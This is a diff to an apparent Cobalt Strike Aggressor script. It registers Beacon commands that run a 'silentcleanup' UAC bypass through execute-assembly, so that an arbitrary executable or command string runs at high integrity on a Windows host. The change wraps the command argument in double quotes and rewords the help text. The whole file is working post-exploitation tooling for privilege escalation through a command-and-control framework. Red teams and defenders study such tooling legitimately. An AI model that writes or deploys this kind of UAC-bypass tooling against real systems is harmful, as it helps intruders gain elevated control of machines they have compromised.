@@ -1,18 +1,19 @@
 alias("uac-silentcleanup-exe", {
-	#btask($1, "foo!");
 	bexecute_assembly($1, script_resource("modules/uac_bypass_silentcleanup_passexe.exe"), $2);
 });
 
 beacon_command_register(
 	"uac-silentcleanup-exe",
-	"Run the silentcleanup UAC bypass",
+	"Run the silentcleanup UAC bypass to execute an arbitary EXE",
 	"Example: uac-silentcleanup [full path to executable to run in high-integrity]");
 
 alias("uac-silentcleanup-command", {
-        bexecute_assembly($1, script_resource("modules/uac_bypass_silentcleanup_passcommand.exe"), $2);
+	# Enclose the args in double quotes
+	$newargs = '"' . $2 . '"';
+	bexecute_assembly($1, script_resource("modules/uac_bypass_silentcleanup_passcommand.exe"), $newargs);
 });
 
 beacon_command_register(
         "uac-silentcleanup-command",
-        "Run the silentcleanup UAC bypass with an abritrary command string",
-        "Example: uac-silentcleanup-command [command string]");
+        "Run the silentcleanup UAC bypass to execute an abritrary command string",
+        "Example: uac-silentcleanup-command [command string enclosed in DOUBLE quotes]");
